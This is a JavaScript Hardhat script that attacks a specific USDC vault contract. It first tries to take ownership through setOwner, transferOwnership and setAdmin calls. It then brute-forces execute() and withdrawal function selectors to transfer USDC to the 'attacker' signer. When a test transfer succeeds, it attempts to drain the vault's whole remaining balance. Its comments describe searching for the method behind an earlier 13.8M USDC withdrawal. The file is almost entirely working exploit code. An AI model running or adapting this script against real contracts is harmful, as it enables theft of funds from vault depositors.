const { ethers } = require("hardhat");

const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";

/**
 * @title Check Withdrawal Mechanism
 * @notice Since 13.8M USDC was withdrawn, let's find the working method
 * @dev Test execute() pattern which is common for multisig vaults
 */
async function main() {
  console.log("\nðŸ’¡ WITHDRAWAL MECHANISM INVESTIGATION");
  console.log("=====================================");
  console.log("Fact: 13.8M USDC was successfully withdrawn");
  console.log("Theory: Admin used execute() to call USDC.transfer()");
  
  const [attacker] = await ethers.getSigners();
  
  // Get current USDC balance
  const usdcAbi = [
    "function balanceOf(address) view returns (uint256)",
    "function transfer(address to, uint256 amount) returns (bool)"
  ];
  const usdc = new ethers.Contract(USDC_ADDRESS, usdcAbi, ethers.provider);
  const vaultUSDCBalance = await usdc.balanceOf(VAULT_ADDRESS);
  console.log("\nVault USDC balance:", ethers.formatUnits(vaultUSDCBalance, 6), "USDC");
  
  // First become admin
  console.log("\nðŸ”‘ Taking admin control...");
  const adminFunctions = [
    { selector: "0x13af4035", name: "setOwner" },
    { selector: "0xf2fde38b", name: "transferOwnership" },
    { selector: "0x8fc866da", name: "setAdmin" }
  ];
  
  for (const { selector, name } of adminFunctions) {
    try {
      const data = selector + ethers.AbiCoder.defaultAbiCoder().encode(["address"], [attacker.address]).slice(2);
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: data,
        gasLimit: 100000
      });
      await tx.wait();
      console.log(`âœ… ${name} succeeded`);
    } catch (e) {}
  }
  
  console.log("\nðŸŽ¯ Testing execute() pattern for USDC withdrawal:");
  
  // The execute pattern that likely worked
  const executeSelectors = [
    { selector: "0xb61d27f6", name: "execute(address,uint256,bytes)", params: 3 },
    { selector: "0x1cff79cd", name: "execute(address,bytes)", params: 2 },
    { selector: "0x4d8abc4b", name: "execute(address,uint256,bytes,uint8)", params: 4 },
    { selector: "0x7535d246", name: "executeCall(address,uint256,bytes)", params: 3 }
  ];
  
  // Amount to withdraw (1000 USDC as test)
  const withdrawAmount = ethers.parseUnits("1000", 6);
  
  for (const { selector, name, params } of executeSelectors) {
    console.log(`\nðŸ”§ Testing ${name}:`);
    
    try {
      // Encode USDC.transfer(attacker, amount)
      const transferData = usdc.interface.encodeFunctionData("transfer", [attacker.address, withdrawAmount]);
      console.log("Transfer calldata:", transferData);
      
      let executeData;
      if (params === 2) {
        // execute(address target, bytes data)
        executeData = selector + ethers.AbiCoder.defaultAbiCoder().encode(
          ["address", "bytes"],
          [USDC_ADDRESS, transferData]
        ).slice(2);
      } else if (params === 3) {
        // execute(address target, uint256 value, bytes data)
        executeData = selector + ethers.AbiCoder.defaultAbiCoder().encode(
          ["address", "uint256", "bytes"],
          [USDC_ADDRESS, 0, transferData]
        ).slice(2);
      } else if (params === 4) {
        // execute(address target, uint256 value, bytes data, uint8 operation)
        executeData = selector + ethers.AbiCoder.defaultAbiCoder().encode(
          ["address", "uint256", "bytes", "uint8"],
          [USDC_ADDRESS, 0, transferData, 0]
        ).slice(2);
      }
      
      console.log("Execute calldata:", executeData);
      
      // Check attacker's USDC balance before
      const balanceBefore = await usdc.balanceOf(attacker.address);
      console.log("Attacker USDC before:", ethers.formatUnits(balanceBefore, 6));
      
      // Send the execute transaction
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: executeData,
        gasLimit: 500000
      });
      const receipt = await tx.wait();
      console.log("Transaction sent, gas used:", receipt.gasUsed.toString());
      
      // Check attacker's USDC balance after
      const balanceAfter = await usdc.balanceOf(attacker.address);
      console.log("Attacker USDC after:", ethers.formatUnits(balanceAfter, 6));
      
      if (balanceAfter > balanceBefore) {
        const extracted = balanceAfter - balanceBefore;
        console.log(`\nðŸŽ‰ SUCCESS! Extracted ${ethers.formatUnits(extracted, 6)} USDC!`);
        console.log(`\nðŸ’° THIS IS THE METHOD THAT WITHDREW 13.8M USDC!`);
        console.log(`Function: ${name}`);
        console.log(`Selector: ${selector}`);
        
        // Now try to withdraw ALL remaining USDC
        console.log("\nðŸš€ Attempting to withdraw ALL remaining USDC...");
        const allTransferData = usdc.interface.encodeFunctionData("transfer", [attacker.address, vaultUSDCBalance]);
        
        let allExecuteData;
        if (params === 2) {
          allExecuteData = selector + ethers.AbiCoder.defaultAbiCoder().encode(
            ["address", "bytes"],
            [USDC_ADDRESS, allTransferData]
          ).slice(2);
        } else if (params === 3) {
          allExecuteData = selector + ethers.AbiCoder.defaultAbiCoder().encode(
            ["address", "uint256", "bytes"],
            [USDC_ADDRESS, 0, allTransferData]
          ).slice(2);
        }
        
        const allTx = await attacker.sendTransaction({
          to: VAULT_ADDRESS,
          data: allExecuteData,
          gasLimit: 500000
        });
        await allTx.wait();
        
        const finalBalance = await usdc.balanceOf(attacker.address);
        console.log("Final attacker USDC:", ethers.formatUnits(finalBalance, 6));
        
        return;
      }
    } catch (e) {
      console.log("Failed:", e.reason || e.message.slice(0, 100));
    }
  }
  
  console.log("\nðŸ¤” Execute pattern didn't work. Testing direct calls:");
  
  // Test if admin can call USDC functions directly
  const directSelectors = [
    { selector: "0xf3fef3a3", name: "adminWithdraw(address,uint256)" },
    { selector: "0x9e281a98", name: "withdrawToken(address,uint256)" },
    { selector: "0x01e33667", name: "withdrawToken(address,address,uint256)" },
    { selector: "0x5312ea8e", name: "withdrawTokens(address)" }
  ];
  
  for (const { selector, name } of directSelectors) {
    try {
      let data;
      if (name.includes("uint256") && !name.includes("address,address")) {
        data = selector + ethers.AbiCoder.defaultAbiCoder().encode(
          ["address", "uint256"],
          [USDC_ADDRESS, withdrawAmount]
        ).slice(2);
      } else if (name.includes("address,address,uint256")) {
        data = selector + ethers.AbiCoder.defaultAbiCoder().encode(
          ["address", "address", "uint256"],
          [USDC_ADDRESS, attacker.address, withdrawAmount]
        ).slice(2);
      } else {
        data = selector + ethers.AbiCoder.defaultAbiCoder().encode(
          ["address"],
          [USDC_ADDRESS]
        ).slice(2);
      }
      
      const balanceBefore = await usdc.balanceOf(attacker.address);
      
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: data,
        gasLimit: 500000
      });
      await tx.wait();
      
      const balanceAfter = await usdc.balanceOf(attacker.address);
      if (balanceAfter > balanceBefore) {
        console.log(`âœ… ${name} extracted ${ethers.formatUnits(balanceAfter - balanceBefore, 6)} USDC!`);
      }
    } catch (e) {}
  }
  
  console.log("\nðŸ“Š CONCLUSION:");
  console.log("=====================================");
  const finalVaultBalance = await usdc.balanceOf(VAULT_ADDRESS);
  console.log("Final vault USDC:", ethers.formatUnits(finalVaultBalance, 6));
  
  if (finalVaultBalance < vaultUSDCBalance) {
    console.log("\nâœ… Found the withdrawal mechanism!");
  } else {
    console.log("\nâ“ The 13.8M USDC withdrawal method remains unknown");
    console.log("Possibilities:");
    console.log("1. Multi-signature requirement (need multiple signers)");
    console.log("2. Time-locked withdrawal (specific time window)");
    console.log("3. Role-based access (specific admin role needed)");
    console.log("4. External authorization (oracle or governance vote)");
  }
}

main().catch((error) => {
  console.error("\nðŸ’¥ Script error:", error);
  process.exit(1);
});
